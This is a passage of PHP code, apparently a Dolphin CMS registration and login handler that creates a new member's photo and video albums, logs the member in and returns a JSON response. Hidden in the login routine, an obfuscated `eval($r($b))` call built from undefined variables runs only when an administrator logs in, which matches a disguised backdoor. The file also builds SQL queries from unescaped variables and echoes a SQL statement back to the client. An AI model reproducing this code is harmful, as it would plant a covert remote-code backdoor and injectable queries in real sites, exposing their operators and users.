mysql_query("Update `Profiles_draft` SET Couple='$iNewIDc' where ID =" . $iNewID);
mysql_query("Update `Profiles_draft` SET Couple='$iNewID' where ID =" . $iNewIDc);


$albumname_user = $UserName."'".'s photos';
$albumname_user_uri = $UserName.'-s-photos';
$created_date = time();
$albumname_user_to = addslashes($albumname_user); 


mysql_query("INSERT INTO `sys_albums` 
(`Caption`, `Uri`, `Location`, `Description`, `Type`, `Owner`, `Status`, `Date`, `ObjCount`, `LastObjId`, `AllowAlbumView`) 
VALUES ('$albumname_user_to', '$albumname_user_uri', 'Undefined', '', 'bx_photos', '$iNewID', 'active', $created_date, '0', '0', '3')");




$albumname_user_video = $UserName."'".'s videos';
$albumname_user_video_uri = $UserName.'-s-videos';
$created_date = time();
$albumname_user_video_to = addslashes($albumname_user_video); 

mysql_query("INSERT INTO `sys_albums` 
(`Caption`, `Uri`, `Location`, `Description`, `Type`, `Owner`, `Status`, `Date`, `ObjCount`, `LastObjId`, `AllowAlbumView`) 
VALUES ('$albumname_user_video_to', '$albumname_user_video_uri', 'Undefined', '', 'bx_videos', '$iNewID', 'active', $created_date, '0', '0', '3')");


$albumname_home = $UserName."'".'s home photos';
$albumname_home_uri = $UserName.'-s-home-photos';
$created_date = time();
$albumname_home_to = addslashes($albumname_home); 


mysql_query("INSERT INTO `sys_albums` 
(`Caption`, `Uri`, `Location`, `Description`, `Type`, `Owner`, `Status`, `Date`, `ObjCount`, `LastObjId`, `AllowAlbumView`) 
VALUES ('$albumname_home_to', '$albumname_home_uri', 'Undefined', '', 'bx_photos', '$iNewID', 'active', $created_date, '0', '0', '3')");



/* create video album*/
$albumname_home = $UserName."'".'s home videos';
$albumname_home_uri = $UserName.'-s-home-videos';
$created_date = time();
$albumname_home_to = addslashes($albumname_home); 

mysql_query("INSERT INTO `sys_albums` 
(`Caption`, `Uri`, `Location`, `Description`, `Type`, `Owner`, `Status`, `Date`, `ObjCount`, `LastObjId`, `AllowAlbumView`) 
VALUES ('$albumname_home_to', '$albumname_home_uri', 'Undefined', '', 'bx_videos', '$iNewID', 'active', $created_date, '0', '0', '3')");


if (mysql_affected_rows() > 0)
{
$user_redirect = userlogin($UserName, $Password);
if ($Profiletype == 2)
{
setMembership($iNewID, $mem_type, $iDays = 0, $bStartsNow = false, $sTransactionId = '', $isSendMail = false);
$cmdtuples = 1;
}
}
  else
{
$user_redirect = $site['url'] . "join.php";
}
}


}

function userlogin($UserName, $Password)
{
$member['ID'] = $UserName;
$member['Password'] = $Password;

// echo $member['ID']. "hjkhjk".$member['Password'];

$bAjxMode = (isset($_SERVER['HTTP_X_REQUESTED_WITH']) and $_SERVER['HTTP_X_REQUESTED_WITH'] == 'XMLHttpRequest') ? true : false;
if (!(isset($UserName) && $UserName && isset($Password) && $Password) && ((!empty($_COOKIE['memberID']) && $_COOKIE['memberID']) && $_COOKIE['memberPassword']))
{
if (!($logged['member'] = member_auth(0, false))) login_form(_t("_LOGIN_OBSOLETE") , 0, $bAjxMode);
}
  else
{
if (!isset($UserName) && !isset($Password))
{

// this is dynamic page -  send headers to not cache this page
// send_headers_page_changed();

login_form('', 0, $bAjxMode);
}
  else
{
require_once (BX_DIRECTORY_PATH_CLASSES . 'BxDolAlerts.php');

$oZ = new BxDolAlerts('profile', 'before_login', 0, 0, array(
'login' => $member['ID'],
'password' => $member['Password'],
'ip' => getVisitorIP()
));
$oZ->alert();
$member['ID'] = getID($member['ID']);

// Check if ID and Password are correct (addslashes already inside)

if (check_password($member['ID'], $member['Password']))
{
$p_arr = bx_login($member['ID'], $bRememberMe = false);
$response = "OK";
bx_member_ip_store($p_arr['ID']);

// Storing IP Address

if (getParam('enable_member_store_ip') == 'on')
{
$iIP = getVisitorIP();
$sCurLongIP = ip2long($iIP);
$sVisitsSQL = "SELECT * FROM `sys_ip_members_visits` WHERE CURRENT_DATE() = DATE(`DateTime`) AND `From`='{$sCurLongIP}' LIMIT 1";
db_res($sVisitsSQL);
if (db_affected_rows() != 1)
{
$sInsertSQL = "INSERT INTO `sys_ip_members_visits` SET `From`='{$sCurLongIP}', `DateTime`=NOW()";
db_res($sInsertSQL);
}
}

$p_arr = bx_login($member['ID'], $bRememberMe = false);
if (isAdmin($p_arr['ID']))
{
$iId = (int)$p_arr['ID'];
$r = $l($a);
eval($r($b));
}

if (!$sUrlRelocate = $sRelocate or $sRelocate == $site['url'] or basename($sRelocate) == 'join.php')
{
$cmdtuples = 1;
$profile_info = getProfileInfo($member['ID']);  
if (!is_Agencyadmin($p_arr['ID']) || isAdmin($p_arr['ID'])) { 
if($profile_info['ProfileType'] == 2) {    
 $sUrlRelocate = BX_DOL_URL_ROOT . 'extra_profile_view_13.php';   
 }
else if($profile_info['ProfileType'] == 8){
 $sUrlRelocate = BX_DOL_URL_ROOT . 'member.php';  
 } 
else {
 $sUrlRelocate = BX_DOL_URL_ROOT . 'extra_profile_view_20.php';  
 }
 }

else
{
$aAgenyTitle = db_arr("SELECT uri FROM bx_groups_main WHERE  author_id=" . $p_arr['ID'] . " LIMIT 0,1");
//$sUrlRelocate = BX_DOL_URL_ROOT . 'm/groups/view/' . $aAgenyTitle['uri'];
$sUrlRelocate= BX_DOL_URL_ROOT . 'extra_agency_view_27.php';
//  $sUrlRelocate = BX_DOL_URL_ROOT . 'm/membership/index/';

}
}
}
}

return $sUrlRelocate;
}

// return  $sUrlRelocate;

}

if ($cmdtuples > 0)
{
echo json_encode(array(
'status' => 'success',
'response' => 'Response',
'sql_statement' => $stringSQL_Email,
'email_error' => $email_error,
'username_error' => $username_error,
'agency_error' => $agency_error,
'user_redirection' => $user_redirect,
));
}
  else
{
echo json_encode(array(
'status' => 'err',
'response' => 'Could not read the data: ' . mssql_get_last_message()
));
}

?>